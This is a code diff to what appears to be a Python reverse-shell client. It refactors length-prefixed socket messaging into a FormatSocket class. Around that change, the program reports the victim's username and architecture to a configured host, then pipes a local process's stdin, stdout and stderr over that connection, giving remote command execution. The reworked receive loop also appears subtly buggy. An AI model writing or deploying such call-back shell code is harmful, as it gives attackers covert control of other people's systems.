@@ -22,11 +22,61 @@ CMD = "cmd"
 
 # Supporting classes
 
-class ByteLockBundler:
+
+class FormatSocket:
+
+    SIZE_BYTES = 4
+    RECV_SIZE = 8192
+
     def __init__(self, sock):
+        self.sock = sock
+        self.lastbytes = b''
+
+    def send(self,msg):
+        '''
+        Takes str or bytes and produces bytes where the first 4 bytes
+        correspond to the message length
+        :param msg: input message
+        :return: <[length][message]>
+        '''
+        if type(msg) == str:
+            msg = str.encode(msg)
+        if type(msg) == bytes:
+            self.sock.sendall(struct.pack('>i', len(msg)) + msg)
+        else:
+            raise Exception("msg must be of type bytes or str")
+
+    def recv(self):
+        '''
+        Receives bytes from recvable, expects first 4 bytes to be length of message,
+        then receives that amount of data and returns raw bytes of message
+        :param recvable: Any object with recv(bytes) function
+        :return:
+        '''
+        total_data = self.lastbytes
+        self.lastbytes = b''
+
+        msg_data = b''
+        expected_size = sys.maxsize
+        while len(msg_data) < expected_size:
+            print("waiting on size")
+            sock_data = self.sock.recv(FormatSocket.RECV_SIZE)
+            total_data += sock_data
+            if expected_size == sys.maxsize and len(total_data) > FormatSocket.SIZE_BYTES:
+                size_data = total_data[:FormatSocket.SIZE_BYTES]
+                expected_size = struct.unpack('>i',size_data)[0]
+                msg_data += total_data[FormatSocket.SIZE_BYTES:]
+            else:
+                msg_data += sock_data
+        # Store anything above expected size for next time
+        self.lastbytes = msg_data[expected_size:]
+        return msg_data[:expected_size]
+
+class ByteLockBundler:
+    def __init__(self, fsock):
         self.stdoutbytes = b''
         self.stderrbytes = b''
-        self.sock = sock
+        self.fsock = fsock
         self.bytelock = threading.Lock()
 
     def setLock(self,lock):
@@ -52,8 +102,7 @@ class ByteLockBundler:
         if len(stdoutbuff) > 0 or len(stderrbuff) > 0:
             outputdict = dict(stdout=stdoutbuff.decode('UTF-8'),stderr=stderrbuff.decode('UTF-8'))
             json_str = json.dumps(outputdict)
-            json_format = formatBytes(json_str)
-            self.sock.sendall(json_format)
+            self.fsock.send(json_str)
 
 # Scripts
 
@@ -66,13 +115,12 @@ def main():
 
                 infodict = dict(user=user, arch=arch)
                 json_str = json.dumps(infodict)
-                json_format = formatBytes(json_str)
-
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 s.connect((HOST, PORT))
-                s.sendall(json_format)
+                fs = FormatSocket(s)
+                fs.send(json_str)
                 print("[+] Sent")
-                serve(s)
+                serve(fs)
             except Exception as e:
                 # TODO: Remove debug code
                 raise e
@@ -105,9 +153,9 @@ def serve(sock):
                 bytelock.writeStderr(out)
 
     def pollSock():
-        recvbytes = recvFormatBytes(sock)
+        recvbytes = sock.recv()
+        print(recvbytes)
         recvjson = json.loads(recvbytes.decode('UTF-8'))
-
         if STDIN in recvjson:
             proc.stdin.write(recvjson[STDIN].encode('UTF-8'))
             proc.stdin.flush()
@@ -139,47 +187,6 @@ def serve(sock):
     t_procerr.join()
     t_bndl.join()
 
-def formatBytes(msg):
-    '''
-    Takes str or bytes and produces bytes where the first 4 bytes
-    correspond to the message length
-    :param msg: input message
-    :return: <[length][message]>
-    '''
-    if type(msg) == str:
-        msg = str.encode(msg)
-    if type(msg) == bytes:
-        return (struct.pack('>i', len(msg)) + msg)
-    else:
-        raise Exception("msg must be of type bytes or str")
-
-
-def recvFormatBytes(recvable):
-    '''
-    Receives bytes from recvable, expects first 4 bytes to be length of message,
-    then receives that amount of data and returns raw bytes of message
-    :param recvable: Any object with recv(bytes) function
-    :return:
-    '''
-    total_len = 0
-    total_data = b''
-    size = sys.maxsize
-    size_data = b''
-    recv_size = 8192
-    while total_len < size:
-        sock_data = recvable.recv(recv_size)
-        if not total_data:
-            if len(sock_data) > 4:
-                size_data += sock_data
-                size = struct.unpack('>i', size_data[:4])[0]
-                recv_size = min(524288, size)
-                total_data += size_data[4:]
-            else:
-                size_data += sock_data
-        else:
-            total_data += sock_data
-        total_len = len(total_data)
-    return total_data
 
 def getInfo():
     proc = subprocess.Popen(["whoami"], stdout=subprocess.PIPE)
